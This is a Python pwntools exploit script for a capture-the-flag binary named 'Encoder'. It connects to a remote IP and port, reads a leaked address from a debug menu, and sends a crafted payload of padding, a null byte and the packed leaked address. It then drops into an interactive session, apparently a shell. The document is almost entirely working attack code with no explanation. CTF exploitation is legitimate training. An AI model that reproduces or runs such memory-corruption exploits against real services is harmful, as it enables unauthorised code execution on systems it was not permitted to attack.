from pwn import *

# p = process('./Encoder')
p = remote('171.244.141.82',4001)
# context.log_level="debug"
p.recvuntil('our choice:')

# base = p.libs()['/mnt/hgfs/1CTF/challenge/SVATTT18/encoder/Encoder']
# gdb.attach(p,"br *0xee7 +"+str(base))
# print hex(base)

# gdb.attach(p,"br *0x1127 +"+str(base))
p.sendline('4')
p.recvuntil('Debug mode is enabled.')
recv = p.recvuntil('==').split('\n')
leak = recv[1][:-1]
print leak
recv =int(recv[1],16)
p.recvuntil('our choice:')
p.sendline('2')
data ='2531332473'

data += (20-len(data))*'1'
# data += "BBBBBBBB"
data += '\x00'+"BBB"+p64(recv)

p.sendlineafter('nter your message:',data)
p.interactive()